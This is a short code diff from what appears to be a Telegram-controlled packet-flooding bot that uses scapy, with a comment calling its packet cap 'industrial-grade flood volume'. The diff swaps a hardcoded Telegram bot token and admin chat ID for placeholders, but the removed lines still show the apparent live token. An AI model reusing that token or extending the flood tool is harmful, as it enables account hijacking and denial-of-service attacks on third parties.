@@ -8,8 +8,8 @@ import time
 from scapy.all import IP, TCP, UDP, ICMP, send, raw
 from telebot import types
 
-TOKEN = "8172992390:AAHfnHlHa67Td686_OVUvEQc7-JsszoP8q0"
-ADMIN_CHAT_ID = 6179284823
+TOKEN = "BOT_TOKEN"
+ADMIN_CHAT_ID = CHAT_ID
 MAX_PACKETS = 1000000  # Industrial-grade flood volume
 
 bot = telebot.TeleBot(TOKEN)
